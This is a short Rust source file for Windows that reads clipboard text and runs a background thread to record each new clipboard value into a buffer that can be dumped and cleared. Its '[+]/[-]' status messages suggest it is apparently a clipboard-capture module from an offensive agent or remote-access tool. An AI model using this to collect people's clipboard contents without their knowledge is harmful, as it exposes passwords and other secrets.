#![allow(dead_code)]
/// Clipboard get and monitor for Windows.

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Mutex, OnceLock};

const CF_UNICODETEXT: u32 = 13;
const CP_UTF8: u32 = 65001;

extern "system" {
    fn OpenClipboard(hWnd: isize) -> i32;
    fn GetClipboardData(uFormat: u32) -> isize;
    fn CloseClipboard() -> i32;
    fn GlobalLock(hMem: isize) -> *mut u16;
    fn GlobalUnlock(hMem: isize) -> i32;
    fn WideCharToMultiByte(
        CodePage: u32, dwFlags: u32, lpWideCharStr: *const u16, cchWideChar: i32,
        lpMultiByteStr: *mut u8, cbMultiByte: i32, lpDefaultChar: *const u8,
        lpUsedDefaultChar: *mut i32,
    ) -> i32;
}

static CLIP_STOP: AtomicBool = AtomicBool::new(true);
static CLIP_BUF: OnceLock<Mutex<String>> = OnceLock::new();

fn clip_buf() -> std::sync::MutexGuard<'static, String> {
    CLIP_BUF.get_or_init(|| Mutex::new(String::new())).lock().unwrap()
}

fn clip_get_raw() -> Option<String> {
    unsafe {
        if OpenClipboard(0) == 0 { return None; }
        let h = GetClipboardData(CF_UNICODETEXT);
        if h == 0 { CloseClipboard(); return None; }
        let p = GlobalLock(h);
        if p.is_null() { CloseClipboard(); return None; }
        let mut len = 0usize;
        while *p.add(len) != 0 { len += 1; }
        let result = if len > 0 {
            let n = WideCharToMultiByte(CP_UTF8, 0, p, len as i32, std::ptr::null_mut(), 0,
                                        std::ptr::null(), std::ptr::null_mut());
            if n > 0 {
                let mut buf = vec![0u8; n as usize];
                WideCharToMultiByte(CP_UTF8, 0, p, len as i32, buf.as_mut_ptr(), n,
                                    std::ptr::null(), std::ptr::null_mut());
                Some(String::from_utf8_lossy(&buf).into_owned())
            } else { None }
        } else { None };
        GlobalUnlock(h);
        CloseClipboard();
        result
    }
}

pub fn clip_get() -> String {
    clip_get_raw().unwrap_or_else(|| "[-] clipboard empty or access denied".to_string())
}

pub fn clip_monitor_start(interval_sec: u64) -> &'static str {
    if !CLIP_STOP.swap(false, Ordering::Relaxed) {
        return "[-] clipboard monitor already running";
    }
    std::thread::spawn(move || {
        let mut last = String::new();
        while !CLIP_STOP.load(Ordering::Relaxed) {
            if let Some(s) = clip_get_raw() {
                if s != last {
                    clip_buf().push_str(&format!("[clipboard] {}\n", s));
                    last = s;
                }
            }
            std::thread::sleep(std::time::Duration::from_secs(interval_sec.max(1)));
        }
    });
    "[+] clipboard monitor started"
}

pub fn clip_monitor_dump() -> String {
    let mut g = clip_buf();
    if g.is_empty() { return "[no clipboard data]".to_string(); }
    let s = g.clone();
    g.clear();
    s
}

pub fn clip_monitor_stop() -> &'static str {
    CLIP_STOP.store(true, Ordering::Relaxed);
    "[+] clipboard monitor stopped"
}
